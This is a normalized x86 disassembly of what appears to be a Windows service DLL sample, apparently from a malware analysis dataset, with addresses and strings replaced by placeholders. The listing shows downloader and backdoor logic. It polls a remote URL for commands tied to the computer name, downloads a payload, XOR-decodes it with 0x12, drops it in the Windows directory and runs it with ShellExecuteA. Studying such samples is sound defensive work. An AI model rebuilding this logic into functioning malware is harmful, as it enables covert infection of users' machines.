ServiceMain
mov eax sub_100018f0
call sub_10001750
sub esp 0x108
push ebx
push esi
mov ebx [ strncpy@IAT ]
push edi
mov edi [ ebp + 0xc ]
mov esi 0x100
push esi
lea eax [ ebp - 0x114 ]
push [ edi ]
push eax
call ebx
push esi
lea eax [ ebp - 0x114 ]
push [ edi ]
push eax
call [ wcstombs@IAT ]
add esp 0x18
lea eax [ ebp - 0x114 ]
push sub_100011bb
push eax
call [ RegisterServiceCtrlHandlerA@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
call [ FreeConsole@IAT ]
push 0x1
push 0x0
push 0x2
call sub_10001173
push 0x0
push 0x0
push 0x4
call sub_10001173
add esp 0x18
cmp [ ebp + 0x8 ] 0x1
jle r-xdata
push 0x1
call ProceA
push 0x3
call ProceA
mov esi [ atoi@IAT ]
push rw-data
call esi
mov edi eax
mov [ esp ] rw-data
call esi
pop ecx
mov esi eax
lea ecx [ ebp - 0x14 ]
call sub_1000149f
and [ ebp - 0x4 ] 0x0
push edi
push esi
lea ecx [ ebp - 0x14 ]
call sub_100014a3
lea ecx [ ebp - 0x14 ]
call sub_100014b6
push esi
lea eax [ ebp - 0x114 ]
push [ edi + 0x4 ]
push eax
call ebx
push esi
lea eax [ ebp - 0x114 ]
push [ edi + 0x4 ]
push eax
call [ wcstombs@IAT ]
add esp 0x18
sub_10001173
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
mov [ rw-data ] eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x10
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x14 ] 0x7
push [ rw-data ]
mov [ ebp - 0x4 ] 0xbb8
call [ SetServiceStatus@IAT ]
leave
retn
sub_100011bb
mov eax [ esp + 0x4 ]
push esi
dec eax
je r-xdata
xor esi esi
push 0x1
push esi
push 0x3
call sub_10001173
add esp 0xc
push 0xa
call [ Sleep@IAT ]
dec eax
je r-xdata
xor esi esi
push 0x1
push esi
push 0x6
call sub_10001173
push esi
push esi
push 0x7
jmp r-xdata
dec eax
je r-xdata
call sub_10001173
add esp 0x18
jmp r-xdata
xor esi esi
push 0x1
push esi
push 0x5
call sub_10001173
push esi
push esi
push 0x4
dec eax
je r-xdata
pop esi
retn 0x4
xor esi esi
push esi
push esi
push [ rw-data ]
jmp r-xdata
dec eax
jne r-xdata
call sub_10001173
add esp 0xc
xor esi esi
jmp r-xdata
push esi
push esi
push 0x1
sub_10001242
push ebp
mov ebp esp
sub esp 0x24
push ebx
xor ebx ebx
push esi
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
call [ InternetOpenA@IAT ]
push ebx
push 0x80000000
push ebx
push ebx
push [ ebp + 0xc ]
mov [ ebp + 0x8 ] eax
push eax
call [ InternetOpenUrlA@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov esi [ InternetCloseHandle@IAT ]
push ebx
call esi
push [ ebp + 0x8 ]
call esi
mov eax rw-data
push edi
lea eax [ ebp + 0xc ]
push ebx
push eax
lea eax [ ebp - 0x24 ]
mov [ ebp + 0xc ] 0x20
push eax
push 0x5
push esi
call [ HttpQueryInfoA@IAT ]
lea eax [ ebp - 0x24 ]
push eax
call [ atol@IAT ]
push eax
mov [ rw-data ] eax
call sub_10001232
mov eax [ rw-data ]
inc eax
push eax
call ??2@YAPAXI@Z
add esp 0xc
mov edi eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
inc eax
push eax
push edi
push esi
call [ InternetReadFile@IAT ]
mov eax [ ebp - 0x4 ]
push esi
mov esi [ InternetCloseHandle@IAT ]
mov [ eax + edi ] bl
call esi
push [ ebp + 0x8 ]
call esi
mov eax edi
pop edi
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_100012f7
push esi
mov esi [ esp + 0x8 ]
push esi
call strlen
pop ecx
mov ecx [ esp + 0x10 ]
cmp ecx eax
jg r-xdata
or eax 0xffffffff
pop esi
retn
push [ esp + 0xc ]
lea eax [ esi + ecx ]
push eax
call [ strstr@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
sub eax esi
pop esi
retn
sub_10001328
push ebp
mov ebp esp
sub esp 0x180
and [ ebp - 0x80 ] 0x0
push esi
push edi
push 0x1f
pop ecx
xor eax eax
lea edi [ ebp - 0x7f ]
push 0x0
[ edi ]
stosw [ edi ]
push rw-data
push [ ebp + 0x10 ]
stosb [ edi ]
call sub_100012f7
mov esi eax
lea eax [ esi + 0x5 ]
push eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call memset
inc esi
lea eax [ ebp - 0x80 ]
push esi
push [ ebp + 0x10 ]
push eax
call memcpy
lea eax [ ebp - 0x80 ]
push rw-data
push eax
call strcat
and [ ebp - 0x180 ] 0x0
add esp 0x2c
xor eax eax
lea edi [ ebp - 0x17f ]
push 0x3f
pop ecx
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x180 ]
push 0x100
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x180 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x180 ]
push eax
call strcat
mov esi [ fopen@IAT ]
lea eax [ ebp - 0x180 ]
push rw-data
push eax
call esi
add esp 0x18
test eax eax
jne r-xdata
push eax
call [ fclose@IAT ]
pop ecx
lea eax [ ebp - 0x180 ]
push rw-data
push eax
call esi
push [ ebp + 0xc ]
mov [ ebp + 0x10 ] eax
push [ ebp + 0x8 ]
call sub_10001242
add esp 0x10
mov esi eax
call sub_1000123c
push 0x50
pop ecx
cmp eax ecx
jbe r-xdata
lea edi [ eax - 0x50 ]
push ebx
push edi
call ??2@YAPAXI@Z
push esi
mov ebx eax
call strlen
pop ecx
xor eax eax
test edi edi
pop ecx
jbe r-xdata
xor [ ecx + esi ] 0x12
inc ecx
cmp ecx eax
jb r-xdata
push [ ebp + 0x10 ]
push 0x1
push edi
push ebx
call [ fwrite@IAT ]
push esi
call ??3@YAXPAX@Z
push ebx
call ??3@YAXPAX@Z
push [ ebp + 0x10 ]
call [ fclose@IAT ]
add esp 0x1c
push 0x1388
call [ Sleep@IAT ]
xor eax eax
lea ecx [ ebp - 0x180 ]
push eax
push eax
push eax
push ecx
push rw-data
push eax
call [ ShellExecuteA@IAT ]
pop ebx
jmp r-xdata
mov cl [ esi + eax + 0x50 ]
mov [ eax + ebx ] cl
inc eax
cmp eax edi
jb r-xdata
pop edi
pop esi
leave
retn
sub_100014b6
sub esp 0x20c
push ebx
push ebp
push esi
push edi
mov [ esp + 0x18 ] ecx
push 0xb798
call [ Sleep@IAT ]
jmp r-xdata
push [ esi + 0x4 ]
call sub_1000101c
test eax eax
pop ecx
jne r-xdata
push [ esi ]
call sub_10001000
test eax eax
pop ecx
je r-xdata
and [ esp + 0x1c ] 0x0
push 0x3f
pop ecx
xor eax eax
lea edi [ esp + 0x1d ]
mov [ esp + 0x14 ] 0x100
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x14 ]
push eax
lea eax [ esp + 0x20 ]
push eax
call [ GetComputerNameA@IAT ]
lea eax [ esp + 0x1c ]
push rw-data
push eax
call sub_10001242
mov ebp eax
push rw-data
push ebp
call strcmp
add esp 0x10
test eax eax
je r-xdata
push 0xea600
and [ esp + 0x11c ] 0x0
push 0x3f
pop ecx
xor eax eax
lea edi [ esp + 0x11d ]
xor esi esi
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x1c ]
mov [ esp + 0x10 ] esi
push eax
lea eax [ esp + 0x120 ]
push rw-data
push eax
call [ sprintf@IAT ]
mov ebx [ strstr@IAT ]
lea eax [ esp + 0x128 ]
push eax
push ebp
call ebx
add esp 0x14
test eax eax
je r-xdata
mov esi [ esp + 0x18 ]
mov edi rw-data
push edi
push ebp
call ebx
pop ecx
test eax eax
pop ecx
je r-xdata
mov [ esp + 0x10 ] 0x1
cmp [ esp + 0x10 ] 0x1
je r-xdata
push 0x1
pop esi
mov esi rw-data
push esi
push ebp
call ebx
pop ecx
test eax eax
pop ecx
je r-xdata
cmp esi 0x1
jne r-xdata
push ebp
call ??3@YAXPAX@Z
mov [ esp ] 0x7b98a00
jmp r-xdata
cmp [ esp + 0x10 ] 0x1
push 0x0
jne r-xdata
call [ Sleep@IAT ]
jmp r-xdata
push edi
lea eax [ esp + 0x120 ]
push eax
jmp r-xdata
mov edi rw-data
push edi
push esi
call ebx
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x0
push edi
push esi
call sub_100012f7
push 0x0
push rw-data
push esi
mov [ esp + 0x28 ] eax
call sub_100012f7
push 0xfffffffb
mov edi eax
pop eax
sub eax [ esp + 0x28 ]
add edi eax
lea eax [ edi + 0x1 ]
push eax
call ??2@YAPAXI@Z
mov ebx eax
mov eax [ esp + 0x2c ]
push edi
lea eax [ eax + esi + 0x5 ]
push eax
push ebx
call memcpy
and [ ebx + edi ] 0x0
push 0x2f
push ebx
call [ strrchr@IAT ]
inc eax
push eax
lea eax [ esp + 0x50 ]
push ebx
push eax
call sub_10001328
push ebx
call ??3@YAXPAX@Z
mov ebx [ strstr@IAT ]
add esp 0x40
push ebp
call sub_100012f7
add esp 0xc
mov edi eax
push edi
push esi
push ebp
call sub_100012f7
push esi
mov [ esp + 0x20 ] eax
call strlen
mov ecx [ esp + 0x20 ]
sub eax edi
add eax ecx
push eax
mov [ esp + 0x24 ] eax
call ??2@YAPAXI@Z
push [ esp + 0x24 ]
add edi ebp
mov esi eax
push edi
push esi
call memcpy
mov edi rw-data
push edi
push esi
call ebx
add esp 0x28
test eax eax
je r-xdata
push esi
call ??3@YAXPAX@Z
push ebp
call ??3@YAXPAX@Z
pop ecx
pop ecx
push 0x3d5720
jmp r-xdata
push 0x0
push edi
push esi
call sub_100012f7
push 0x0
push rw-data
push esi
mov ebx eax
call sub_100012f7
push 0xfffffff8
mov edi eax
pop eax
sub eax ebx
add edi eax
push edi
call ??2@YAPAXI@Z
lea ecx [ ebx + esi + 0x8 ]
push edi
push ecx
push eax
mov [ esp + 0x38 ] eax
call memcpy
push [ esp + 0x38 ]
call [ atoi@IAT ]
imul eax eax 0xea60
add esp 0x2c
push eax
call [ Sleep@IAT ]
push [ esp + 0x10 ]
call ??3@YAXPAX@Z
push esi
call ??3@YAXPAX@Z
push ebp
call ??3@YAXPAX@Z
add esp 0xc
jmp r-xdata
sub_1000179a
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_1000179a
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_1000103d
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_1000179a
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_1000179a
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_10001000
push rw-data
call [ GetLocalTime@IAT ]
movzx eax [ rw-data ]
sub eax [ esp + 0x4 ]
neg eax
sbb eax eax
inc eax
retn
sub_1000101c
push rw-data
call [ GetLocalTime@IAT ]
movzx eax [ rw-data ]
xor ecx ecx
cmp eax [ esp + 0x4 ]
setge cl
mov eax ecx
retn
sub_1000103d
mov eax [ esp + 0x8 ]
dec eax
jne r-xdata
push 0x1
pop eax
retn 0xc
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
sub_10001232
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_1000123c
mov eax [ rw-data ]
retn
sub_1000149f
mov eax ecx
retn
sub_100014a2
retn
sub_100014a3
mov eax [ esp + 0x4 ]
push 0x1
mov [ ecx ] eax
mov eax [ esp + 0xc ]
mov [ ecx + 0x4 ] eax
pop eax
retn 0x8
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_10001750
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
??2@YAPAXI@Z
jmp [ operator new@IAT ]
strlen
jmp [ strlen@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
strcat
jmp [ strcat@IAT ]
memcpy
jmp [ memcpy@IAT ]
memset
jmp [ memset@IAT ]
strcmp
jmp [ strcmp@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_100018e8
lea ecx [ ebp - 0x14 ]
jmp sub_100014a2
sub_100018f0
mov eax r--data
jmp __CxxFrameHandler
